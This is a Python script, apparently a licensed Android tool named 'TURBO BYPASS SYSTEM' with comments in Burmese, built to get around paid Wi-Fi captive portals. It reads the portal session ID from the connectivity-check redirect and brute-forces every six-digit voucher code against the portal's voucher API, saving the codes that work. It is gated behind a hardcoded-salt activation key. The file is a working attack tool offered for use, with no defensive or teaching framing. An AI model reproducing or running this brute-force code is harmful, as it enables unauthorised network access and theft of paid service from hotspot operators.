import requests
import re
import urllib3
import time
import threading
import hashlib
import os
from urllib.parse import urlparse, parse_qs, urljoin

# Warning ပိတ်ခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
SECRET_SALT = "ohmygod@123"
PING_THREADS = 30
PING_INTERVAL = 0.05
SUCCESS_FILE = "success.txt"

def get_stable_id():
    """Device တစ်ခုအတွက် ပုံသေဖြစ်နေမည့် Hardware ID ကို ထုတ်ပေးခြင်း"""
    try:
        serial = os.popen("getprop ro.serialno").read().strip()
        if not serial:
            serial = os.popen("getprop ro.build.display.id").read().strip()
    except:
        serial = "DEFAULT_NODE"
    return f"TRB-{hashlib.md5(serial.encode()).hexdigest()[:10].upper()}"

def verify_activation():
    """Activation key စစ်ဆေးခြင်း logic"""
    device_id = get_stable_id()
    key_file = os.path.join(os.path.expanduser("~"), ".turbo_license")
    correct_key = hashlib.sha256(f"{device_id}{SECRET_SALT}".encode()).hexdigest()[:12].upper()
    
    if os.path.exists(key_file):
        with open(key_file, "r") as f:
            if f.read().strip() == correct_key:
                return True

    print(f"DEVICE ID: {device_id}")
    input_key = input("Enter Activation Key: ").strip().upper()
    if input_key == correct_key:
        with open(key_file, "w") as f: f.write(input_key)
        return True
    return False

def check_internet():
    try:
        return requests.get("http://www.google.com", timeout=1).status_code == 200
    except: return False

def get_portal_session():
    """Portal ရဲ့ Session ID နှင့် လိုအပ်သော URL များကို ရှာဖွေခြင်း"""
    try:
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
        if r.url == "http://connectivitycheck.gstatic.com/generate_204": return None, None, None
        
        portal_url = r.url
        parsed = urlparse(portal_url)
        host = f"{parsed.scheme}://{parsed.netloc}"
        
        # Session ID ကို URL query ထဲမှ ရှာခြင်း
        sid = parse_qs(parsed.query).get('sessionId', [None])[0]
        return host, sid, parsed.query
    except: return None, None, None

def start_bruteforce(host, sid):
    """Voucher code များကို 000000 မှ 999999 အထိ အလိုအလျောက် စမ်းသပ်ခြင်း"""
    print(f"\n[!] Starting Bruteforce for SID: {sid}")
    api_url = f"{host}/api/auth/voucher/"
    
    # စမ်းသပ်မည့် range (ဗီဒီယိုထဲကအတိုင်း 6 digit)
    for i in range(1000000):
        code = f"{i:06d}"
        try:
            payload = {'accessCode': code, 'sessionId': sid, 'apiVersion': 1}
            resp = requests.post(api_url, json=payload, timeout=2)
            
            if resp.status_code == 200:
                print(f"\n[✔] SUCCESS: {code}")
                with open(SUCCESS_FILE, "a") as f: f.write(f"{code} | {time.ctime()}\n")
                return code
            else:
                print(f"[*] Testing Code: {code} (Failed)  ", end='\r')
        except: continue
    return None

def main_menu():
    if not verify_activation():
        print("Access Denied.")
        return

    os.system('clear')
    print("="*30)
    print(" TURBO BYPASS SYSTEM ")
    print("="*30)
    print("1) Get Internet Access")
    print("2) Bruteforce Access Voucher Code")
    print("3) Recheck Success Code")
    print("="*30)
    
    choice = input("Enter an Option: ")
    
    host, sid, query = get_portal_session()
    if not sid:
        print("\n[!] Error: No Portal Session Found. Check Wifi Connection.")
        return

    if choice == '1':
        # ပုံမှန်အတိုင်း Token နှင့် ကျော်ခြင်း
        print(f"[*] Using Default Bypass for SID: {sid}")
        # အောက်တွင် သင်၏ မူလ Pinging logic ကို ထည့်သွင်းနိုင်သည်
        
    elif choice == '2':
        found_code = start_bruteforce(host, sid)
        if found_code:
            print(f"\n[!] Success! Use {found_code} to login.")
            
    elif choice == '3':
        if os.path.exists(SUCCESS_FILE):
            print("\n--- Saved Success Codes ---")
            with open(SUCCESS_FILE, "r") as f: print(f.read())
        else:
            print("\n[!] No history found.")

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\nStopped.")
        
